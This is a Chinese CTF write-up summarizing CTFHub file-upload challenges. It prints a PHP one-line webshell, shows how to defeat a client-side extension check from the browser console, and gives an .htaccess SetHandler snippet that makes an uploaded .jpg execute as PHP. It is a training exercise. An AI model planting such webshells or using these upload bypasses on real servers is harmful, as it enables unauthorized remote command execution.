---
title: '[题型总结 & CTFHub]上传文件'
date: '2021-10-05 21:20:05'
draft: false
categories: ['CTF']
tags: ['.htaccess', 'CTF', 'CTFHub', 'PHP', '一句话木马', '前端验证', '文件上传', '无验证', '题型总结','Writeup']
description: "结合 CTFHub 练习整理文件上传题型，记录无验证、前端校验与 .htaccess 等场景的原理和解题过程。"
---

###### 原理

通过一些手段绕过拦截验证机制上传一句话木马文件(Webshell)到目标服务器并且能成功访问它,然后向其发送请求执行我们要执行的命令.

###### 条件

* 能够将木马成功上传到目标服务器
* 能够找到上传的木马文件,并成功访问
* 一句话木马中的函数能够成功运行

###### 一句话木马示例

以PHP为例: `<?php @eval($_POST("shell")); ?>` (@的作用是不显示错误信息,以免被人发现)

## CTFHub技能树中例题

### 无验证

直接上传一句话木马即可

![001](https://image.txgde.space/2021/10/image-2.png)

bebebe

访问该文件并通过POST请求发送命令

![002](https://image.txgde.space/2021/10/image-3.png)

经过列出目录命令发现在../里有flag\_301433253.php文件

通过show\_source()函数输出flag\_301433253.php的内容获取flag

![003](https://image.txgde.space/2021/10/image-4.png)

后面几个例题就主要说说怎么绕过验证

### 前端验证

打开题目所给链接,查看元素发现以下javascript代码:

``` js
 function checkfilesuffix()
{
    var file=document.getElementsByName('file')[0]['value'];
    if(file==""||file==null)
    {
        alert("请添加上传文件");
        return false;
    }
    else
    {
        var whitelist=new Array(".jpg",".png",".gif");
        var file_suffix=file.substring(file.lastIndexOf("."));
        if(whitelist.indexOf(file_suffix) == -1)
        {
            alert("该文件不允许上传");
            return false;
        }
    }
} 
```

这段函数的作用是判断文件后缀名是否为`.jpg` `.png` `.gif` , 不是的话返回`false`上传失败. 不过好在这个验证程序是写在前端的,我们可以在前端直接对这段函数进行操作.

我们将这段函数中 `alert("该文件不允许上传");` 后的`return false;` 改成`return true;` ,然后复制修改过后的函数到控制台回车运行,如图:

![005](https://image.txgde.space/2021/10/image-5.png)

然后上传我们的一句话木马,在弹出"该文件不允许上传"后又会弹出"上传成功".

### .htaccess

打开题目所给链接,查看元素发现以下被注释掉的javascript代码,根据题目猜想是目标服务器通过.htaccess实现了下列函数的功能

``` js
<!--
if (!empty($_POST['submit'])) {
    $name = basename($_FILES['file']['name']);
    $ext = pathinfo($name)['extension'];
    $blacklist = array("php", "php7", "php5", "php4", "php3", "phtml", "pht", "jsp", "jspa", "jspx", "jsw", "jsv", "jspf", "jtml", "asp", "aspx", "asa", "asax", "ascx", "ashx", "asmx", "cer", "swf");
    if (!in_array($ext, $blacklist)) {
        if (move_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_PATH . $name)) {
            echo "<script>alert('上传成功')</script>";
            echo "上传文件相对路径<br>" . UPLOAD_URL_PATH . $name;
        } else {
            echo "<script>alert('上传失败')</script>";
        }
    } else {
        echo "<script>alert('文件类型不匹配')</script>";
    }
}
-->
```

函数功能是判断文件后缀名是否在黑名单中,在就输出"文件类型不匹配".

做这道题我们首先要了解Apache的[Sethandler指令](https://httpd.apache.org/docs/2.4/mod/core.html#sethandler) ,将其写入到.htaccess文件里可以将匹配到的文件强制使用另一种处理程序处理. 简单来说就是可以把一种文件强制当作另一种文件. 例如本题将使用的绕过代码:

``` xml
<FilesMatch "shell.jpg">  
        SetHandler application/x-httpd-php  
</FilesMatch>
```

这段代码放进.htaccess中可将shell.jpg这个文件当作php文件处理.

好了,接下来让我们进行绕过工作

1. 将写好的PHP一句话木马的后缀名改成JPG或者其他允许的文件类型
2. 创建一个.htaccess的文件(因为Windows不允许创建名字为空的文件,因此具体创建方法可以自行到网上搜索),将以上绕过代码填入其中,保存并上传,因为黑名单中没有.htaccess,可以直接上传.
3. 最后直接访问<http://xxxxx.com/upload/shell.jpg老套路即可(链接及文件名根据自己情况修改)>

目前先写到这,还有几道题有时间再写^ ^
